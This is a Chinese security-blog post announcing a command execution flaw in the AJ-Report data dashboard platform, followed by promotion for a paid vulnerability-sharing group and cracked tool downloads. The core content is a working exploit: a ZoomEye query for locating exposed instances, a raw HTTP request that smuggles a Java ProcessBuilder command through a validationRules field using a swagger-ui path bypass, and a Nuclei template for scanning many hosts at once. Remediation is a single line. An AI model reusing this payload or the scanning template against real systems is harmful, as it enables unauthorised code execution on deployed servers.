#  AJ-Report数据大屏系统存在命令执行漏洞（未公开）|漏洞预警   
原创 漏洞挖掘  渗透安全HackTwo   2024-05-03 18:13  
  
###   
#   
0x01 产品简介  
          
  
AJ-Report是一个完全开源的BI平台，酷炫大屏展示，能随时随地掌控业务动态，让每个决策都有数据支撑。多数据源支持，内置mysql、elasticsearch、kudu等多种驱动，支持自定义数据集省去数据接口开发，支持17+种大屏组件，不会开发，照着设计稿也可以制作大屏。三步轻松完成大屏设计：配置数据源---->写SQL配置数据集---->拖拽配置大屏---->保存发布。欢迎体验  
。  
这里利用 **ZoomEye**  
****搜索引擎直接输入关键字即可，影响资产非常多  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq7VUPicxpyfNoRgjTAPRCGKY2ZBloia1CCDZwZFSoWibfgE2Pm7I3pex6Oh1M4ARxLNibjw5FBnZRRebQ/640?wx_fmt=png&from=appmsg "")  
  
  
**声明******  
  
> 请自行搭建环境进行漏洞测试，该公众号或作者星球分享的工具、项目、漏洞仅供安全研究与学习之用请勿用于非法行为，如用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
  
  
**TIPS:**  
**末尾领取资料及福利-批量检测脚本在末尾（新增语雀漏洞库）**  
  
0x02 漏洞描述        攻击者可以通过不同的方式获取命令执行漏洞的利用机会，如通过Web应用程序的输入参数、文件上传漏洞等方式注入系统命令，并在Web服务器上执行。在这些漏洞可以被很容易地利用和滥用的低级别语言或系统中，例如C或Windows下的cmd.exe或powershell.exe，从而导致被攻击的系统受到各种操作系统级别的攻击和利用。0x03 ZoomEye语法title:"AJ-Report"0x04 漏洞复现POCPOST /dataSetParam/verification;swagger-ui/ HTTP/1.1Host: {}Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Content-Type: application/json;charset=UTF-8Connection: closeContent-Length: 345{"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"whoami\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}Nuclei批量检测POC（请自行搭建环境检测）id: AJ-Report-swagger-ui-rceinfo:  name: AJ-Report-swagger-ui-rce  author: HackTwo  severity: high  description: |    漏洞测试-RCE  reference:    - https://wx.zsxq.com/dweb2/index/group/88885811181452  tags: autohttp:  - raw:      - |        POST /dataSetParam/verification;swagger-ui/ HTTP/1.1        Host: {{Hostname}}        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2        Accept-Encoding: gzip, deflate        Content-Type: application/json;charset=UTF-8        Connection: close        {"ParamName":"","paramDesc":"","paramType":"","sampleItem":"1","mandatory":true,"requiredFlag":1,"validationRules":"function verification(data){a = new java.lang.ProcessBuilder(\"whoami\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}"}    matchers:      - type: dsl        dsl:          - status_code==200 && contains_all(body,"message","args","操作成功")0x05 修复建议官方已经推出新版本，建议升级到最新版0x06 知识星球-V1.3星球新增语雀漏洞速查库，会将每月收集到POC同步更新进去包含但不限于1day/0day/Nday漏洞。后续会将一些SRC报告脱敏后同步更新到语雀，目前加入星球仍然低价！内部VIP星球介绍需要加入内部知识星球可点击下方链接，资源包含但不限于网上未公开的1day/0day漏洞2024 更新漏洞POC共1000+2024最新SRC/CNVD/Edu实战挖掘技巧报告，红队内网横向渗透，代码审计，JS逆向，SRC培训等课程。圈子对新人友好，加入圈子拥有FOFA shadan 360Quake ZoomEye Tide 零零信安 Hunter Ctfshow等等高级会员账号，SRC文档，武器库。圈子里面资料价值至少在10K以上，目前星球内部主题600+，资源2000+，其他和网盘资源1w+并持续更新中，越早加入价格越低(详情点击下方地址了解-->>还是觉得价格贵的师傅后台回复" 星球 "有优惠券使用名额有限先到先得)👉点击了解-->>>>内部VIP知识星球福利介绍V1.3版本-星球介绍近期更新的0day/1day(包含公开和未公开漏洞-仅列举部分)漏洞整理已更新至1000+需要的加入星球获取一些漏洞报告200+(仅列举部分)加入星球获取更多资源及视频资源持续更新中！  
  
**结尾**  
  
# 免责声明  
  
  
# 获取方法  
  
  
回复“**app**  
" 获取  app渗透和app抓包教程  
  
回复“**渗透字典**" 获取 针对一些字典重新划分处理，收集了几个密码管理字典生成器用来扩展更多字典的仓库。  
  
回复“**书籍**" 获取 网络安全相关经典书籍电子版pdf  
  
压缩包解压密码：HackTwo  
  
  
  
# 免责声明  
  
  
        
文章中的案例或工具仅面向合法授权的企业安全建设行为，如您需要测试内容的可用性，请自行搭建靶机环境，勿用于非法行为。如  
用于其他用途，由使用者承担全部法律及连带责任，与作者和本公众号无关。  
本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用。  
如您在使用本工具或阅读文章的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。  
本工具或文章或来源于网络，若有侵权请联系作者删除，请在24小时内删除，请勿用于商业行为，自行查验是否具有后门，切勿相信软件内的广告！  
  
  
  
# 往期推荐  
  
  
**1. 内部VIP知识星球福利介绍V1.3版本**  
  
**2. 最新BurpSuite2023.12.1专业版中英文版下载**  
  
**3. 最新Nessus2024下载Windows/Linux**  
  
[4. 最新xray1.9.11高级版下载Windows/Linux](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483882&idx=1&sn=e1bf597eb73ee7881ae132cc99ac0c8e&chksm=cf16a75af8612e4c73eda9f52218ccfc6de72725eb37aff59e181435de095b71e653b446c521&scene=21#wechat_redirect)  
  
  
[5. 最新HCL AppScan Standard 10.4.128273破解版下载](http://mp.weixin.qq.com/s?__biz=Mzg3ODE2MjkxMQ==&mid=2247483850&idx=1&sn=8fad4ed1e05443dce28f6ee6d89ab920&chksm=cf16a77af8612e6c688c55f7a899fe123b0f71735eb15988321d0bd4d14363690c96537bc1fb&scene=21#wechat_redirect)  
  
  
  
###### 渗透安全HackTwo  
  
  
微信号：关注公众号获取  
  
后台回复星球加入：  
知识星球  
  
扫码关注 了解更多  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjOvISzUFq6qFFAxdkV2tgPPqL76yNTw38UJ9vr5QJQE48ff1I4Gichw7adAcHQx8ePBPmwvouAhs4ArJFVdKkw/640?wx_fmt=png "二维码")  
  
  
  
喜欢的朋友可以点赞转发支持一下  
  
  
